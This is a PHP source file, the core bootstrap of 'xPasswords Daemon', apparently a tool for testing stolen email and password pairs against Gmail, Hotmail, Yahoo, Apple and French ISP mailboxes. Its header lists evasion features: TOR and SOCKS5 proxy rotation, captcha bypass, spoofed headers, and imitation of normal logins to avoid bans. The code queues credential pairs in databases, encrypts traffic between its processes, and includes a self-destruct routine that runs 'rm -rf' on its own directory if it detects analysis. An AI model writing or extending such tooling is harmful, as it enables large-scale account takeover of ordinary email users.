<?php
namespace xPasswords;
/*
    xPasswords Daemon 0.69 © 2014
    
    // How to run
    php ./xPasswords-Daemon.php --threads=INT --debug=BOOL --with-compression=BOOL
    
    // Features:
        The main idea is to test passwords combinaisons without headhaches
        
        // Security:
        // -> AES 256 bits encryption
        // -> TOR-based communications
        // -> Auto-melt on reverse-engeenering tentative
        // -> Encoded with ionCube
        // -> Full SOCKS 5 support
        // -> Shuffling searching requests (for mailboxes)
        // -> Bypassing captcha
        // -> Random user-agent / x-forwarded-for
        // -> Test valid accounts when authentication fail a lot to prevent ban
        // -> Imitate an normal behavior perfectly

        // Performance:
        // -> Fully multi-thread (up to 100 threads)
        // -> OptimizeSearch Technology (for mailboxes)
        // -> GZIP compression
            
    // Supported providers for emails:
        * GMAIL (INTL)
        * HOTMAIL (INTL)
        * YAHOO (INTL)
        * ORANGE (INTL)
        * APPLE (INTL)
        * FREE (FRA)
        * SFR (FRA)
        * BOUYGUES (FRA)
        * LAPOSTE (FRA)
        // ToDo:
        * GMX (INTL) (gmx.*)
        * AOL (INTL) (aol.*)
        * VERIZON (INTL) (verizon.net)
        * CARAMAIL (FRA) (caramail.*) (?)
        * TELENET (BEL) (telenet.be)
        * BOLAND (BEL) (boland.be)
        * SKYNET (BEL) (skynet.be)
        * SWISSCOM BLUEMAIL (CHE) (bluemail.ch)
        * O2 (GBR) (o2.co.uk)
        
*/

// Load Bootstrap
define('XPASSWORDS_HANDLER', true);

// Up memory limits
set_time_limit(0);
ini_set('suhosin.memory_limit', '1024M');
ini_set('memory_limit', '1024M');

// Set correct timezone
date_default_timezone_set('Europe/Paris');

// Error reporting
error_reporting(E_ALL ^ E_NOTICE ^ E_STRICT);
libxml_use_internal_errors(true);

// Run autoload
require('../vendor/autoload.php');
\Requests::register_autoloader();

// Load dependencies
require('Defines.php');
require('Colors.php');
require('Encrypter.php');
require('Network.php');
require('IMAP.php');
require('SOCKS.php');
require('ChildProcess.php');

class Core {

    // List of custom user agents (from SQLMap)
    static public $UserAgent = [];

    // Providers vars storage
    static public $authenticationProvidersDirectory = './Providers/';
    static public $authenticationProvidersNamespace = '\xPasswords\Providers\\';
    static public $authenticationProviders = [];
    
    // SOCKS Servers
    static public $SocksServers = [];

    // Prepare Cipher
    static public $Cipher = false;
    static public $CipherNetwork = false;

    public static function say($string = false, $options = []) {

        // Children behavior
        if(XPASSWORDS_IS_CHILDREN) {
            // Return json string compatible with parent script            
            return Core::$Cipher->encrypt(Core::encode([
                'type' => 'gossip',
                'childOutput' => [
                    'text' => $string,
                    'options' => $options,
                ],
            ])) . CRLF;
        }

        if(!isset($options['color'])) {
            $options['color'] = NULL;
        }
        if(!isset($options['colorBackground'])) {
            $options['colorBackground'] = NULL;
        }

        // Sanitize string
        // Prevent injection of any sort in console
        if(!isset($options['noFilter'])) {
            $string = filter_var($string, FILTER_SANITIZE_STRING, FILTER_FLAG_STRIP_HIGH | FILTER_FLAG_ENCODE_HIGH | FILTER_FLAG_NO_ENCODE_QUOTES);
        }

        // Set appropriate color
        $getColors = new Colors();
        $string = $getColors->getColoredString($string, $options['color'], $options['colorBackground']);
        $getColors = NULL;

        // Options for no-newline
        if(isset($options['inline']) AND $options['inline']) return $string;

        return CRLF . $string;
    }

    public static function sayDone() {
        echo Core::say(' Done !', ['color' => 'green', 'inline' => true]);
    }

    private static function removeFolder($dir) {

        if(!is_dir($dir)) {
            return false;
        }

        $objects = scandir($dir);

        foreach($objects as $object) {

            if($object == '.' OR $object == '..') {
                 continue;   
            }

            $dirObject = $dir . '/' . $object;

            if (filetype($dirObject) == 'dir') {
                Core::removeFolder($dirObject);
            } else {
                unlink($dirObject);
            }
        }

        reset($objects);
        rmdir($dir);
    }

    public static function selfSuicide() {

        // Prevent removing in debug mode
        if(!defined('XPASSWORDS_IS_PRODUCTION')) {
            echo 'Suicide has been detected, please fix it';
            exit(0);
            return false;
        }
        if(XPASSWORDS_IS_PRODUCTION === false) {
            echo 'Suicide has been detected, please fix it';
            exit(0);
            return false;
        }
        if(defined('_DEBUG_MODE')) {
            echo 'Suicide has been detected, please fix it';
            exit(0);
            return false;
        }

        if(defined('XPASSWORDS_HANDLER')) {            
            $currentDir = CURRENT_DIR;
        } else {
            $currentDir = rtrim(__DIR__, 'libraries');
        }

        // Use Faster way if Linux is the OS
        if(DIRECTORY_SEPARATOR == '/') { // Linux
            if(function_exists('exec')) {
                if($currentDir == '/') {
                    return false;
                }
                @exec('rm -rf ' . $currentDir . "/ >> /dev/null &");
            }
        } else {
            // Use slower but safer way for non linux devices
            Core::removeFolder($currentDir);
        }

        // Say at the end
        if(defined('XPASSWORDS_HANDLER')) {
            echo Core::say('[ERROR] An reverse-engineering tentative has been detected. Goodbye !', ['color' => 'red']);
        } else {
            echo 'An reverse-engineering tentative has been detected. Goodbye !';
        }

        exit(0);
    }

    public static function sleep($seconds) {
        @sleep($seconds);
        return true;
    }

    public static function alertBox($text) {
        echo $text;
        $handle = fopen('php://stdin','r');
        return trim(fgets($handle));
    }

    public static function shuffleAssoc(&$array) {

        $keys = array_keys($array);

        shuffle($keys);

        foreach($keys as $key) {
            $new[$key] = $array[$key];
        }

        $array = $new;

        return true;
    }

    public static function getUserAgent() {

        // Cache user-agent file in array
        $cacheUserAgent = function() {
            //Core::$UserAgent = file('./txt/user-agents.txt');
            return 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36';//Core::$UserAgent;
        };

        // Select random User-Agent
        $fContents = (!empty(Core::$UserAgent) ? Core::$UserAgent : $cacheUserAgent());
        return $fContents;
        //return trim($fContents[rand(3, count($fContents) - 1)]);
    }

    public static function getVar($value = false) {
        $opts = @getopt('f:', [$value . ':']);
        return ((isset($opts[$value]) AND !empty($opts[$value])) ? $opts[$value] : false);
    }

    public static function getProxy($Country=NULL) {

        if(XPASSWORDS_IS_CHILDREN) {
            return Core::$SocksServers;    
        }
        
        // Randomize proxy datas
        $Server = rand(0, (count(static::$SocksServers[ $Country ]) - 1));
        
        // Check username or password
        if(!isset(static::$SocksServers[ $Country ][ $Server ]['username']) OR
           !isset(static::$SocksServers[ $Country ][ $Server ]['password'])) {
            return [
                'type' => 'SOCKS5',
                'authentication' => [
                    static::$SocksServers[ $Country ][ $Server ]['hostname']
                ],
            ];
        }

        return [
            'type' => 'SOCKS5',
            'authentication' => [
                static::$SocksServers[ $Country ][ $Server ]['hostname'],
                static::$SocksServers[ $Country ][ $Server ]['username'],
                static::$SocksServers[ $Country ][ $Server ]['password'],
            ],
        ];
    }

    // Check if domain name can be tested or used
    public static function providerCheck($emailFrom) {

        $emailFrom = explode('.', $emailFrom)[0];

        try {

            foreach(static::$authenticationProviders as $provider => $supportedDomains) {
                $supportedDomains = $supportedDomains['supportedDomains'];
                foreach($supportedDomains as $supportedDomain) {
                    if($emailFrom == $supportedDomain) throw new \Exception($provider);
                }
            }

        } catch (\Exception $e) {
            return ucfirst(strtolower($e->getMessage()));
        }

        return false;
    }

    public static function compress($datas) {
        if(Core::getVar('with-compression') !== 'true') return $datas; // Check if compression is active
        return bzcompress($datas);
    }
    public static function decompress($datas) {
        if(Core::getVar('with-compression') !== 'true') return $datas; // Check if compression is active
        return bzdecompress($datas);
    }

    public static function encode($datas) {
        return json_encode($datas);
    }
    public static function decode($datas) {
        return json_decode($datas, true);
    }

    public static function cURLCode($string = false) {
        preg_match('/^Requests_Exception: cURL error (.+?):/iu', $string, $string);
        return $string;   
    }

    static public function isSHA1($str = false) {
        return (bool) preg_match('/^[0-9a-f]{40}$/iu', $str);
    }

    static public function isMD5($str = false) {
        return (bool) preg_match('/^[a-f0-9]{32}$/iu', $str);
    }

    static public function isJSON($str = false) {
        json_decode($str);
        return (json_last_error() == JSON_ERROR_NONE);
    }

    static public function isBASE64($str = false) {
        return (base64_encode(base64_decode($str)) === $str);
    }

    static public function dateNow() {
        return (new \DateTime())->format('Y-m-d H:i:s');
    }
};


// Bootstrap Class
class Bootstrap {

    // Database configuration
    static public $Database = NULL;
    static public $DEFAULT_ENCODING = 'utf8';

    // Database access
    static public $DatabaseCredentials = [
        'hostname' => '127.0.0.1',
        'username' => 'root',
        'password' => XPASSWORDS_CLIENT_DATABASE_PASSWORD,
        'database' => 'xpasswords',
    ];

    public static function tryAgain($options, $function, $onError) {

        // Set counter variable
        $counter = 0;

        // Options
        if(!empty($options['text'])) echo Core::say($options['text'], ['color' => 'red']);
        if(!empty($options['sleep'])) Core::sleep($options['sleep']);

        while(1) {

            try {

                if(isset($options['options'])) {
                    $output = $function($counter, $options['options']);
                } else {
                    $output = $function($counter);
                }

                if($output === false) {
                    if(!empty($options['text'])) echo Core::say($options['text'], ['color' => 'red']);
                    throw new \Exception();
                    continue;
                }

                return $output;

            } catch (\Exception $e) {
                $counter++;
                if($counter == $options['nbrOfTimes']) {
                    $onError();
                    if(empty($options['silent'])) echo Core::say('[ERROR] Unable to get proper output, aborting.', ['color' => 'red']);
                    return false;
                }
            }

            if(!empty($options['sleep'])) Core::sleep($options['sleep']);
        }
    }

    // Connect to SQLite Database using PDO
    public static function DatabaseConnect($wayToConnect) {

        switch($wayToConnect) {

            case XPASSWORDS_FILENAME_CLIENT: // Connection from the client, use local database MySQL
            try {
                Bootstrap::$Database = new \PDO('mysql:host=' . static::$DatabaseCredentials['hostname'] . ';dbname=' . static::$DatabaseCredentials['database'], static::$DatabaseCredentials['username'], static::$DatabaseCredentials['password'], [
                    \PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES ' . static::$DEFAULT_ENCODING, // Make connection UTF-8
                    \PDO::ATTR_DEFAULT_FETCH_MODE => \PDO::FETCH_ASSOC,
                    \PDO::ATTR_ERRMODE => \PDO::ERRMODE_EXCEPTION, // ERRMODE_WARNING | ERRMODE_EXCEPTION | ERRMODE_SILENT
                ]);
            } catch(\Exception $e) {
                if(!XPASSWORDS_IS_CHILDREN) echo Core::say('[ERROR] Unable to access to database. Details: ' . $e->getMessage(), ['color' => 'red']);
                return false;
            }
            break;

            case XPASSWORDS_FILENAME_SERVER: // Connection from the server, use local database SQLite
            try {
                Bootstrap::$Database = new \PDO('sqlite:' . dirname(__FILE__) . '/' . 'xDatabase.sqlite');
                Bootstrap::$Database->setAttribute(\PDO::ATTR_DEFAULT_FETCH_MODE, \PDO::FETCH_ASSOC);
                Bootstrap::$Database->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION); // ERRMODE_WARNING | ERRMODE_EXCEPTION | ERRMODE_SILENT
            } catch(\Exception $e) {
                echo Core::say('[ERROR] Unable to access to database. ' . $e->getMessage(), ['color' => 'red']);
                return false;
            }

            // Create tables if this is not the case
            if(!XPASSWORDS_IS_CHILDREN) echo Core::say('[INFO] Creating SQLite tables if they don\'t exists...', ['color' => 'blue']);
            Bootstrap::$Database->query('CREATE TABLE IF NOT EXISTS xPasswordsQueueIn (
                id            INTEGER         PRIMARY KEY AUTOINCREMENT,
                sId         TEXT,
                sEmail         TEXT,
                sPassword     TEXT,
                sCountry     TEXT,
                sFor     TEXT,
                sAdvancedOptions     TEXT,
                isBusy     TEXT
            );');
            Bootstrap::$Database->query('CREATE TABLE IF NOT EXISTS xPasswordsQueueOut (
                id            INTEGER         PRIMARY KEY AUTOINCREMENT,
                sDatas     TEXT,
                isBusy     TEXT
            );');
            if(!XPASSWORDS_IS_CHILDREN) Core::sayDone(); // Okay !
            break;
        }

        // Prevent cleanup from a child
        if(XPASSWORDS_IS_CHILDREN) {
            return true;
        }

        // Unlock entries from database
        echo Core::say('[INFO] Cleaning up database...', ['color' => 'blue']);
        Bootstrap::$Database->beginTransaction();
        switch($wayToConnect) {

            case XPASSWORDS_FILENAME_CLIENT: // Connection from the client, use local database MySQL
            // Optimize tables
            $stmtA = Bootstrap::$Database->prepare('OPTIMIZE TABLE xAccounts, xAuthenticationsSuccess, xCombinaisons, xScanId, xSocks');
            $stmtA->execute();
            break;

            case XPASSWORDS_FILENAME_SERVER: // Connection from the server, use local database SQLite
            // Unlock entries from database
            $stmtA = Bootstrap::$Database->prepare('UPDATE xPasswordsQueueIn SET isBusy=0');
            $stmtA->execute();
            $stmtA = Bootstrap::$Database->prepare('UPDATE xPasswordsQueueOut SET isBusy=0');
            $stmtA->execute();
            break;
        }
        Bootstrap::$Database->commit();
        $stmtA = NULL;

        // Okay !
        Core::sayDone();

        return true;
    }

    // Remove entry from database
    /*public static function rmvDatabase($sId, $tableFrom) {

        // Remove from database
        $stmt = Bootstrap::$Database->prepare('DELETE FROM ' . $tableFrom . ' WHERE id=:sId');
        $stmt->execute([
            'sId' => $sId,
        ]);

        // Remove from QueueIn (if this is come from)
        if($tableFrom == 'xPasswordsQueueIn') {
            // Remove from array
            Bootstrap::$accountCredentials[ $sId ] = NULL;
            unset(Bootstrap::$accountCredentials[ $sId ]);

            // And restore the slot
            Server::$availableSlots = Server::$availableSlots + 1;
        }

        return true;
    }*/
};

// Initialize AES cipher
Core::$Cipher = new Encrypter([
    'encryptionKey' => XPASSWORDS_CHILD_ENCRYPTION_KEY,
]);
Core::$CipherNetwork = new Encrypter([
    'encryptionKey' => XPASSWORDS_IO_NETWORK_KEY,
]);

// Splash screen
if(XPASSWORDS_IS_SERVER OR XPASSWORDS_IS_CLIENT) echo Core::say(CRLF . '        ___                                    _     
__  __ / _ \__ _ ___ _____      _____  _ __ __| |___ 
\ \/ // /_)/ _` / __/ __\ \ /\ / / _ \| \'__/ _` / __|
 >  </ ___/ (_| \__ \__ \\ V  V / (_) | | | (_| \__ \
/_/\_\/    \__,_|___/___/ \_/\_/ \___/|_|  \__,_|___/  ' . (XPASSWORDS_IS_CLIENT ? 'Client' : 'Server') . ' Daemon
', ['color' => 'blue', 'noFilter' => true]);

// Everything is loaded
if(XPASSWORDS_IS_SERVER OR XPASSWORDS_IS_CLIENT) echo Core::say('[INFO] Bootstrap loaded.', ['color' => 'blue']);

// Common launching gossip and verifications
if(XPASSWORDS_IS_SERVER OR XPASSWORDS_IS_CLIENT) echo Core::say('[INFO] xPasswords version: ' . XPASSWORDS_VERSION, ['color' => 'blue']);

// AES 256 BITS
if(!extension_loaded('mcrypt')) {
    if(XPASSWORDS_IS_SERVER OR XPASSWORDS_IS_CLIENT) echo Core::say('[ERROR] Mcrypt extension needed.', ['color' => 'red']);
    exit(0);
}
if(XPASSWORDS_IS_SERVER) echo Core::say('[INFO] Using software AES-256 bits encryption (for database, child threads and network I/O).', ['color' => 'blue']);
if(XPASSWORDS_IS_CLIENT) echo Core::say('[INFO] Using software AES-256 bits encryption (for child threads and network I/O).', ['color' => 'blue']);

// GZIP Compression
if((XPASSWORDS_IS_SERVER OR XPASSWORDS_IS_CLIENT) AND Core::getVar('with-compression')) echo Core::say('[INFO] Gzip compression activated.', ['color' => 'blue']);

// Verify PHP version
// Only usage from CLI is allowed
if(PHP_SAPI !== 'cli') {
    if(XPASSWORDS_IS_SERVER OR XPASSWORDS_IS_CLIENT) echo Core::say('[ERROR] This script run only in CLI. Example: php ./xPasswords.php --threads=INT --local=BOOL', ['color' => 'red']);
    exit(0);
}
if(XPASSWORDS_IS_SERVER OR XPASSWORDS_IS_CLIENT) echo Core::say('[INFO] PHP version: ' . phpversion() . ' CLI', ['color' => 'blue']);
if (version_compare(phpversion(), '5.5.0') <= 0) {
    if(XPASSWORDS_IS_SERVER OR XPASSWORDS_IS_CLIENT) echo Core::say('[ERROR] You version of PHP is lower than 5.5.0, please update.', ['color' => 'red']);
    exit(0);
}

// Verify IonCube availbility
if(!function_exists('ioncube_loader_version')) {
    if(XPASSWORDS_IS_SERVER OR XPASSWORDS_IS_CLIENT) echo Core::say('[ERROR] ionCube Loader must be installed to continue.', ['color' => 'red']);
    exit(0);
}
if(XPASSWORDS_IS_SERVER OR XPASSWORDS_IS_CLIENT) echo Core::say('[INFO] ionCube Loader version: ' . ioncube_loader_version(), ['color' => 'blue']);
define('XPASSWORDS_IS_PRODUCTION', ioncube_file_is_encoded());

// Verify cURL version
if(!function_exists('curl_init')) {
    if(XPASSWORDS_IS_SERVER OR XPASSWORDS_IS_CLIENT) echo Core::say('[ERROR] cURL >= 7.30.0 must be installed to continue.', ['color' => 'red']);
    exit(0);
}
if(XPASSWORDS_IS_SERVER OR XPASSWORDS_IS_CLIENT) echo Core::say('[INFO] cURL version: ' . curl_version()['version'], ['color' => 'blue']);

if(XPASSWORDS_IS_SERVER OR XPASSWORDS_IS_CHILDREN) {
    if(version_compare(curl_version()['version'], '7.30.0', '<')) {
        if(XPASSWORDS_IS_SERVER OR XPASSWORDS_IS_CLIENT) echo Core::say('[ERROR] Please use cURL 7.30.0 or newer (compile it with phpize)', ['color' => 'red']);
        if(XPASSWORDS_IS_SERVER OR XPASSWORDS_IS_CLIENT) echo Core::say('[ERROR] Why ? IMAP support is limited on earlier version', ['color' => 'red']);
        exit(0);
    }
}
// Verify JSON version
if(!function_exists('json_encode') OR !function_exists('json_decode')) {
    if(XPASSWORDS_IS_SERVER OR XPASSWORDS_IS_CLIENT) echo Core::say('[ERROR] JSON extension must be installed to continue.', ['color' => 'red']);
    exit(0);
}